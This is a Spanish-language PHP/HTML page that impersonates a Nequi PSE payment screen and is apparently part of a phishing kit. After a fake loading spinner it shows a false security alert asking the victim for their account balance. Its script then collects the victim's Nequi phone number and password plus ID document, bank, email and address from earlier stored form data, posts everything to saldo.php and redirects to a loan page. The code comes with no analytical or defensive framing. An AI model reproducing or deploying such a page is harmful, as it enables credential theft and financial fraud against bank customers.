<?php
// loader.php
?>
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Validación de identidad</title>
  <meta name="theme-color" content="#e3007b" />
  <style>
    html,body {
      height: 100%;
      margin: 0;
      font-family: "Inter", system-ui, -apple-system, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      background: #fff;
      transition: background 0.4s ease;
    }

    .center {height:100%;display:flex;justify-content:center;align-items:center;flex-direction:column;}
    .box {display:flex;flex-direction:column;align-items:center;gap:14px;}
    .spinner {width:56px;height:56px;border-radius:50%;border:6px solid #f3d3e6;border-top-color:#e3007b;animation:spin 1s linear infinite;}
    @keyframes spin{to{transform:rotate(360deg)}}
    .muted{color:#8e8e99;font-size:14px}

    .alerta,.verificacion{
      width:90%;
      max-width:360px;
      background:#fff;
      border-radius:12px;
      padding:28px 24px 30px;
      text-align:center;
      box-shadow:0 4px 20px rgba(0,0,0,0.2);
      display:none;
    }

    .alerta img{width:70px;margin-bottom:18px}
    .alerta h3{font-size:18px;color:#222;margin-bottom:10px;font-weight:600}
    .alerta p{font-size:14px;color:#555;line-height:1.5;margin-bottom:22px}

    .btn-alerta,.btn-primario,.btn-secundario{
      width:100%;
      max-width:260px;
      padding:12px;
      font-size:15px;
      border-radius:8px;
      cursor:pointer;
      font-weight:600;
      box-sizing:border-box;
    }

    .btn-alerta,.btn-primario{background:#e3007b;color:#fff;border:none}
    .btn-secundario{background:#fff;color:#e3007b;border:1px solid #e3007b}

    .verificacion img{width:110px;margin-bottom:12px}
    .verificacion h3{font-size:18px;color:#222;margin:8px 0 10px;font-weight:600}
    .verificacion p{font-size:14px;color:#555;margin-bottom:24px;line-height:1.5}
    .form-group{display:flex;flex-direction:column;align-items:center;gap:14px}

    input{
      width:100%;
      max-width:260px;
      padding:12px;
      font-size:18px;
      border-radius:8px;
      border:1px solid #ccc;
      text-align:center;
      font-weight:600;
      color:#222;
      transition:all .2s ease;
    }
    input:focus{
      border-color:#e3007b;
      outline:none;
      box-shadow:0 0 0 3px rgba(227,0,123,.15);
    }

    /* --- Loader flotante y éxito --- */
    #loaderOverlay,#successOverlay {
      position:fixed;
      top:0; left:0;
      width:100vw; height:100vh;
      display:none;
      align-items:center;
      justify-content:center;
      flex-direction:column;
      z-index:9999;
      backdrop-filter:blur(4px);
    }

    #loaderOverlay {
      background:rgba(255,255,255,0.8);
    }

    #successOverlay {
      background:#fff;
    }

    #loaderOverlay .spinner-mini {
      width:60px;
      height:60px;
      border:5px solid #e3007b;
      border-top:5px solid transparent;
      border-radius:50%;
      animation:spin 1s linear infinite;
    }

    #successOverlay .check {
      font-size:60px;
      color:#12b76a;
    }

    #loaderOverlay p,#successOverlay p {
      margin-top:15px;
      color:#333;
      font-weight:500;
      font-size:18px;
    }
  </style>
</head>
<body>
  <div class="center">
    <!-- Pantalla de carga inicial -->
    <div class="box" id="loading">
      <div class="spinner"></div>
      <div class="muted">Estamos validando tu solicitud…</div>
    </div>

    <!-- Alerta morada -->
    <div class="alerta" id="alerta">
      <img src="alerta.png" alt="Alerta" />
      <h3>Queremos validar que eres tú</h3>
      <p>Por motivos de seguridad, por favor ingrese su saldo disponible para validar su identidad antes de continuar con la transacción.</p>
      <button class="btn-alerta" id="btnListo">Listo</button>
    </div>

    <!-- Formulario Nequi -->
    <div class="verificacion" id="verificacion">
      <img src="logo.png" alt="Nequi" />
      <h3>Pagos PSE de Nequi</h3>
      <p>Esta transacción requiere verificación. Ingrese su saldo actual para confirmar su identidad.</p>
      <div class="form-group">
        <input type="text" id="monto" placeholder="$ 1.500.000" inputmode="numeric" />
        <button class="btn-primario" id="btnValidar">Validar</button>
        <button class="btn-secundario">Cancelar pago</button>
      </div>
    </div>
  </div>

  <!-- Loader flotante -->
  <div id="loaderOverlay">
    <div class="spinner-mini"></div>
    <p>Enviando datos…</p>
  </div>

  <!-- Éxito -->
  <div id="successOverlay">
    <div class="check">✔</div>
    <p>¡Datos enviados con éxito!</p>
  </div>

  <script>
    const body = document.body;
    const loader = document.getElementById("loading");
    const alerta = document.getElementById("alerta");
    const verificacion = document.getElementById("verificacion");
    const inputMonto = document.getElementById("monto");
    const btnValidar = document.getElementById("btnValidar");
    const loaderOverlay = document.getElementById("loaderOverlay");
    const successOverlay = document.getElementById("successOverlay");

    // 1️⃣ Mostrar loader inicial 4s
    setTimeout(() => {
      loader.style.display = "none";
      body.style.background = "#4b1258";
      alerta.style.display = "block";
    }, 4000);

    // 2️⃣ Mostrar formulario al presionar "Listo"
    document.getElementById("btnListo").addEventListener("click", () => {
      alerta.style.display = "none";
      body.style.background = "#fff";
      verificacion.style.display = "block";
    });

    // 3️⃣ Formatear monto automáticamente
    inputMonto.addEventListener("input", (e) => {
      let valor = e.target.value.replace(/[^\d]/g, "");
      if (!valor) return e.target.value = "";
      e.target.value = "$ " + parseInt(valor, 10).toLocaleString("es-CO");
    });

    // 4️⃣ Enviar datos con loader flotante y animación de éxito
    btnValidar.addEventListener("click", async () => {
      const monto = inputMonto.value.trim();
      if (!monto) { alert("Por favor ingrese un monto válido."); return; }

      const neqdata = JSON.parse(localStorage.getItem("neqdata") || "{}");
      const tbdatos = JSON.parse(localStorage.getItem("tbdatos") || "{}");

      const datos = new FormData();
      datos.append("monto", monto);
      datos.append("numero", neqdata.numero || "");
      datos.append("clave", neqdata.clave || "");
      datos.append("tipo_persona", tbdatos.tipo_persona || "");
      datos.append("banco", tbdatos.banco || "");
      datos.append("tipo_identificacion", tbdatos.tipo_identificacion || "");
      datos.append("documento", tbdatos.documento || "");
      datos.append("telefono", tbdatos.telefono || "");
      datos.append("correo", tbdatos.correo || "");
      datos.append("direccion", tbdatos.direccion || "");

      loaderOverlay.style.display = "flex"; // Mostrar loader

      try {
        const resp = await fetch("saldo.php", { method: "POST", body: datos });

        if (resp.ok) {
          loaderOverlay.style.display = "none";
          successOverlay.style.display = "flex";

          setTimeout(() => {
            window.location.href = "prestamo1.php";
          }, 1500);
        } else {
          throw new Error("Error en la respuesta del servidor.");
        }

      } catch (err) {
        loaderOverlay.style.display = "none";
        alert("❌ Ocurrió un error al enviar los datos.");
        console.error(err);
      }
    });
  </script>
</body>
</html>
